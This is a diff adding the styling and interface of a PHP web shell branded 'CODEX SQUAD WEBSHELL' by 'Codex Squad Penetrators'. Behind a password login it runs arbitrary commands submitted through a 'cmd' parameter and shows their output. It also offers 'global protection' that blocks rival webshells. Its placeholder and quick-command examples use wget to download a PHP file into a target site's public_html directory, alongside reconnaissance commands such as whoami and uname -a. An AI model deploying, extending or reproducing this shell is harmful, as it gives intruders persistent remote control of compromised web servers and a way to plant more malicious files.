+            font-weight: 700;
+            font-size: 0.95em;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        .form-input, .command-input {
+            width: 100%;
+            padding: 12px 15px;
+            border: none;
+            border-radius: 12px;
+            background: #f0f0f0;
+            box-shadow: 
+                inset 4px 4px 8px #e0e0e0,
+                inset -4px -4px 8px #ffffff;
+            font-size: 1em;
+            color: #333;
+            transition: all 0.2s ease;
+            -webkit-appearance: none;
+            appearance: none;
+            font-family: inherit;
+        }
+        
+        .form-input:focus, .command-input:focus {
+            outline: none;
+            box-shadow: 
+                inset 3px 3px 6px #e0e0e0,
+                inset -3px -3px 6px #ffffff;
+        }
+        
+        .button-group {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            width: 100%;
+        }
+        
+        .row-buttons {
+            display: flex;
+            gap: 10px;
+            width: 100%;
+        }
+        
+        .neumorphic-button {
+            flex: 1;
+            padding: 14px 10px;
+            border: none;
+            border-radius: 12px;
+            font-size: 0.95em;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+            background: #f0f0f0;
+            color: #333;
+            box-shadow: 
+                6px 6px 12px #e0e0e0,
+                -6px -6px 12px #ffffff;
+            position: relative;
+            overflow: hidden;
+            min-height: 50px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            user-select: none;
+            text-align: center;
+        }
+        
+        .neumorphic-button::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255, 255, 255, 0.1);
+            opacity: 0;
+            transition: opacity 0.2s;
+        }
+        
+        .neumorphic-button:active::after {
+            opacity: 1;
+        }
+        
+        .neumorphic-button:active {
+            transform: translateY(1px);
+            box-shadow: 
+                inset 3px 3px 6px #e0e0e0,
+                inset -3px -3px 6px #ffffff;
+        }
+        
+        .alert {
+            padding: 12px;
+            border-radius: 12px;
+            margin-bottom: 15px;
+            text-align: center;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            box-shadow: 
+                6px 6px 12px #e0e0e0,
+                -6px -6px 12px #ffffff;
+            border: 1px solid rgba(255, 255, 255, 0.5);
+            font-size: 0.9em;
+        }
+        
+        .alert-danger {
+            background: #f0f0f0;
+            color: #ff4444;
+            border-color: rgba(255, 68, 68, 0.3);
+        }
+        
+        .alert-success {
+            background: #f0f0f0;
+            color: #00aa00;
+            border-color: rgba(0, 170, 0, 0.3);
+        }
+        
+        .alert-info {
+            background: #f0f0f0;
+            color: #0066cc;
+            border-color: rgba(0, 102, 204, 0.3);
+        }
+        
+        .key-display {
+            background: #f0f0f0;
+            border-radius: 12px;
+            padding: 12px;
+            margin-top: 15px;
+            font-family: 'Courier New', monospace;
+            word-break: break-all;
+            box-shadow: 
+                inset 3px 3px 6px #e0e0e0,
+                inset -3px -3px 6px #ffffff;
+            border: 1px solid rgba(255, 255, 255, 0.5);
+            font-size: 0.85em;
+        }
+        
+        .command-form {
+            margin-bottom: 15px;
+        }
+        
+        .output-container {
+            background: #1a1a1a;
+            border-radius: 12px;
+            padding: 15px;
+            margin-top: 15px;
+            max-height: 300px;
+            overflow-y: auto;
+            box-shadow: 
+                inset 3px 3px 6px #000000,
+                inset -3px -3px 6px #333333;
+            border: 1px solid #333;
+            -webkit-overflow-scrolling: touch;
+        }
+        
+        pre {
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85em;
+            line-height: 1.4;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+        
+        .info-panel {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+            margin-top: 15px;
+            padding-top: 15px;
+            border-top: 2px solid rgba(0, 0, 0, 0.08);
+        }
+        
+        .info-box {
+            background: #f0f0f0;
+            border-radius: 12px;
+            padding: 12px;
+            text-align: center;
+            box-shadow: 
+                4px 4px 8px #e0e0e0,
+                -4px -4px 8px #ffffff;
+            transition: all 0.2s ease;
+            border: 1px solid rgba(255, 255, 255, 0.5);
+        }
+        
+        .info-box:active {
+            transform: translateY(1px);
+            box-shadow: 
+                inset 3px 3px 6px #e0e0e0,
+                inset -3px -3px 6px #ffffff;
+        }
+        
+        .info-label {
+            font-size: 0.75em;
+            color: #666;
+            margin-bottom: 5px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        .info-value {
+            font-size: 1em;
+            font-weight: 800;
+            color: #333;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 15px;
+            padding-top: 15px;
+            border-top: 2px solid rgba(0, 0, 0, 0.08);
+            color: #666;
+            font-size: 0.75em;
+            line-height: 1.4;
+        }
+        
+        .install-button {
+            width: 100%;
+            margin-top: 10px;
+        }
+        
+        /* Mobile optimizations */
+        @media (max-width: 360px) {
+            .title {
+                font-size: 1.3em;
+            }
+            
+            .neumorphic-container {
+                padding: 10px;
+                border-radius: 15px;
+            }
+            
+            .login-container, .command-interface {
+                padding: 12px;
+                border-radius: 12px;
+            }
+            
+            .neumorphic-button {
+                padding: 12px 8px;
+                font-size: 0.9em;
+                min-height: 45px;
+            }
+            
+            .info-panel {
+                grid-template-columns: 1fr;
+                gap: 8px;
+            }
+            
+            .form-input, .command-input {
+                padding: 10px 12px;
+                font-size: 0.95em;
+            }
+        }
+        
+        /* Prevent landscape mode */
+        @media (orientation: landscape) {
+            body::before {
+                content: "Please rotate your device to portrait mode for best experience";
+                position: fixed;
+                top: 0;
+                left: 0;
+                right: 0;
+                bottom: 0;
+                background: #f0f0f0;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                font-size: 18px;
+                font-weight: bold;
+                color: #333;
+                text-align: center;
+                padding: 20px;
+                z-index: 9999;
+            }
+            
+            .neumorphic-container {
+                opacity: 0.3;
+                pointer-events: none;
+            }
+        }
+        
+        /* Touch optimizations */
+        .neumorphic-button {
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
+        
+        input, textarea, button {
+            font-size: 16px; /* Prevent zoom on iOS */
+        }
+        
+        /* Hide scrollbars but keep functionality */
+        .output-container::-webkit-scrollbar {
+            width: 4px;
+        }
+        
+        .output-container::-webkit-scrollbar-track {
+            background: #1a1a1a;
+        }
+        
+        .output-container::-webkit-scrollbar-thumb {
+            background: #00ff00;
+            border-radius: 2px;
+        }
+        
+        /* Button styling for specific buttons */
+        .get-key-btn {
+            order: 1;
+        }
+        
+        .login-btn {
+            order: 2;
+        }
+        
+        .execute-btn {
+            order: 1;
+        }
+        
+        .logout-btn {
+            order: 2;
+        }
+        
+        /* Ensure all content fits portrait */
+        @media (max-height: 700px) {
+            .neumorphic-container {
+                padding: 10px;
+                margin: 5px;
+            }
+            
+            .header {
+                margin-bottom: 10px;
+            }
+            
+            .login-container, .command-interface {
+                margin-bottom: 10px;
+            }
+            
+            .output-container {
+                max-height: 200px;
+            }
+        }
+        
+        @media (max-height: 600px) {
+            .output-container {
+                max-height: 150px;
+            }
+            
+            .info-panel {
+                margin-top: 10px;
+                padding-top: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="neumorphic-container">
+        <div class="header">
+            <h4 class="title">CODEX SQUAD WEBSHELL</h4>
+            <p class="subtitle">SECURITY IS JUST AN ILLUSION</p>
+        </div>
+        
+        <?php if (!$logged_in || !$key_valid): ?>
+            <!-- Login Form -->
+            <div class="login-container">
+                <?php if (isset($login_error)): ?>
+                    <div class="alert alert-danger">
+                        <?php echo htmlspecialchars($login_error); ?>
+                    </div>
+                <?php endif; ?>
+                
+                <?php if (isset($key_display)): ?>
+                    <div class="alert alert-success">
+                        SECURITY KEY GENERATED
+                    </div>
+                    <div class="key-display">
+                        <strong>SECURITY KEY:</strong><br>
+                        <?php echo htmlspecialchars($key_display); ?>
+                    </div>
+                <?php endif; ?>
+                
+                <form method="POST" action="">
+                    <div class="form-group">
+                        <label class="form-label" for="password">AUTHORIZED ACCESS ONLY</label>
+                        <input type="password" 
+                               id="password" 
+                               name="password" 
+                               class="form-input" 
+                               placeholder="ENTER PASSWORD" 
+                               required>
+                    </div>
+                    
+                    <div class="button-group">
+                        <div class="row-buttons">
+                            <!-- GET KEY on LEFT, LOGIN on RIGHT -->
+                            <button type="submit" name="get_key" class="neumorphic-button get-key-btn">
+                                GET KEY
+                            </button>
+                            <button type="submit" name="login" class="neumorphic-button login-btn">
+                                LOGIN
+                            </button>
+                        </div>
+                    </div>
+                </form>
+            </div>
+        <?php else: ?>
+            <!-- Protection Status -->
+            <?php if (isset($install_success)): ?>
+                <div class="alert alert-success">
+                    <?php echo htmlspecialchars($install_success); ?>
+                </div>
+            <?php endif; ?>
+            
+            <?php if ($blocked_files > 0): ?>
+                <div class="alert alert-info">
+                    <?php echo $blocked_files; ?> FILES BLOCKED THIS SESSION
+                </div>
+            <?php endif; ?>
+            
+            <?php if (!empty($detected_webshells)): ?>
+                <div class="alert alert-danger">
+                    <?php echo count($detected_webshells); ?> WEBSHELLS NEUTRALIZED
+                </div>
+            <?php endif; ?>
+            
+            <!-- Install Global Protection -->
+            <div style="margin-bottom: 15px;">
+                <a href="?install=1" class="neumorphic-button install-button">
+                  [ ACTIVATE GLOBAL PROTECTION ]
+                </a>
+            </div>
+            
+            <div class="command-interface">
+                <div class="command-form">
+                    <div class="form-group">
+                        <label class="form-label" for="cmd">
+                            ENTER COMMAND TERMINAL
+                        </label>
+                        <input type="text" 
+                               name="cmd" 
+                               id="cmd" 
+                               class="command-input" 
+                               placeholder="Example: wget -O /home/user/domains/target.com/public_html/0xC0D3X.php https://raw.githubusercontent.com/user/repo/main/file.php" 
+                               autofocus
+                               value="<?php echo isset($_GET['cmd']) ? htmlspecialchars($_GET['cmd']) : ''; ?>">
+                    </div>
+                    <div class="button-group">
+                        <div class="row-buttons">
+                            <!-- EXECUTE on LEFT, LOGOUT on RIGHT -->
+                            <button type="submit" form="cmdForm" class="neumorphic-button execute-btn">
+                                EXECUTE
+                            </button>
+                            <a href="?logout=true" class="neumorphic-button logout-btn">
+                                LOGOUT
+                            </a>
+                        </div>
+                    </div>
+                </div>
+                
+                <form method="GET" id="cmdForm" style="display: none;">
+                    <input type="hidden" name="cmd" id="cmdHidden">
+                </form>
+                
+                <?php if (isset($_GET['cmd'])): ?>
+                    <div class="output-container">
+                        <pre>
+<?php
+$command = trim($_GET['cmd']);
+    
+if (!empty($command)) {
+    // Use the safe command execution function
+    $output = executeSafeCommand($command);
+    
+    foreach ($output as $line) {
+        echo htmlspecialchars($line) . "\n";
+    }
+    
+    // Run protection after command execution
+    $new_blocked = runContinuousFileProtection();
+    if ($new_blocked > 0) {
+        echo "\n=== 0xC0D3X PROTECTION ===\n";
+        echo "$new_blocked malicious file(s) blocked\n";
+    }
+}
+?>
+                        </pre>
+                    </div>
+                <?php endif; ?>
+            </div>
+            
+            <div class="info-panel">
+                <div class="info-box">
+                    <div class="info-label">STATUS</div>
+                    <div class="info-value">ACTIVE</div>
+                </div>
+                <div class="info-box">
+                    <div class="info-label">FILES BLOCKED</div>
+                    <div class="info-value"><?php echo $blocked_files; ?></div>
+                </div>
+                <div class="info-box">
+                    <div class="info-label">WEBSHELLS</div>
+                    <div class="info-value"><?php echo count($detected_webshells); ?></div>
+                </div>
+                <div class="info-box">
+                    <div class="info-label">WGET ALLOWED</div>
+                    <div class="info-value">YES</div>
+                </div>
+            </div>
+            
+            <div class="footer">
+                <p>Secure wget execution enabled for GitHub/raw URLs</p>
+                <p>All Rights Reserved Codex Squad Penetrators - 2024</p>
+            </div>
+        <?php endif; ?>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const cmdInput = document.getElementById('cmd');
+            const cmdHidden = document.getElementById('cmdHidden');
+            const cmdForm = document.getElementById('cmdForm');
+            
+            if (cmdInput && cmdForm) {
+                cmdInput.addEventListener('input', function() {
+                    cmdHidden.value = this.value;
+                });
+                
+                const executeButton = document.querySelector('button[form="cmdForm"]');
+                if (executeButton) {
+                    executeButton.addEventListener('click', function(e) {
+                        e.preventDefault();
+                        cmdHidden.value = cmdInput.value;
+                        cmdForm.submit();
+                    });
+                }
+                
+                cmdInput.addEventListener('keypress', function(e) {
+                    if (e.key === 'Enter') {
+                        e.preventDefault();
+                        cmdHidden.value = this.value;
+                        cmdForm.submit();
+                    }
+                });
+                
+                // Auto-fill example wget command on focus
+                cmdInput.addEventListener('focus', function() {
+                    if (this.value === '') {
+                        this.placeholder = "Example: wget -O /home/user/domains/target.com/public_html/0xC0D3X.php https://raw.githubusercontent.com/user/repo/main/file.php";
+                    }
+                });
+            }
+            
+            // Mobile optimizations
+            document.addEventListener('touchstart', function() {}, {passive: true});
+            document.addEventListener('touchmove', function() {}, {passive: true});
+            
+            // Prevent zoom on double-tap
+            let lastTouchEnd = 0;
+            document.addEventListener('touchend', function(event) {
+                const now = Date.now();
+                if (now - lastTouchEnd <= 300) {
+                    event.preventDefault();
+                }
+                lastTouchEnd = now;
+            }, false);
+            
+            // Auto-focus command input on mobile
+            if (cmdInput && window.innerWidth < 768) {
+                setTimeout(() => {
+                    cmdInput.focus();
+                }, 300);
+            }
+            
+            // Force portrait mode
+            function forcePortrait() {
+                if (window.innerWidth > window.innerHeight) {
+                    const message = document.createElement('div');
+                    message.innerHTML = 'Please rotate your device to portrait mode';
+                    message.style.cssText = `
+                        position: fixed;
+                        top: 0;
+                        left: 0;
+                        right: 0;
+                        bottom: 0;
+                        background: #f0f0f0;
+                        display: flex;
+                        justify-content: center;
+                        align-items: center;
+                        font-size: 18px;
+                        font-weight: bold;
+                        color: #333;
+                        text-align: center;
+                        padding: 20px;
+                        z-index: 9999;
+                    `;
+                    if (!document.body.querySelector('div[style*="portrait mode"]')) {
+                        document.body.appendChild(message);
+                    }
+                }
+            }
+            
+            forcePortrait();
+            window.addEventListener('resize', forcePortrait);
+            window.addEventListener('orientationchange', forcePortrait);
+            
+            // Adjust layout for different screen heights
+            function adjustLayout() {
+                const container = document.querySelector('.neumorphic-container');
+                const bodyHeight = window.innerHeight;
+                
+                if (container) {
+                    if (bodyHeight < 600) {
+                        container.style.padding = '8px';
+                        container.style.margin = '5px 0';
+                    } else {
+                        container.style.padding = '15px';
+                        container.style.margin = 'auto';
+                    }
+                }
+            }
+            
+            adjustLayout();
+            window.addEventListener('resize', adjustLayout);
+            
+            // Add quick command examples
+            const quickCommands = [
+                'wget -O 0xC0D3X.php https://raw.githubusercontent.com/example/repo/main/0xC0D3X.php',
+                'pwd',
+                'ls -la',
+                'whoami',
+                'uname -a'
+            ];
+            
+            // Optional: Add a quick command selector (uncomment if needed)
+            /*
+            const quickSelect = document.createElement('select');
+            quickSelect.innerHTML = '<option>Quick Commands</option>' + 
+                quickCommands.map(cmd => `<option value="${cmd}">${cmd.substring(0, 50)}...</option>`).join('');
+            quickSelect.style.cssText = 'width:100%;margin-bottom:10px;padding:8px;border-radius:8px;';
+            quickSelect.addEventListener('change', function() {
+                if (this.value && cmdInput) {
+                    cmdInput.value = this.value;
+                    cmdHidden.value = this.value;
+                }
+            });
+            document.querySelector('.command-form').insertBefore(quickSelect, document.querySelector('.button-group'));
+            */
+        });
+    </script>
+</body>
+</html>
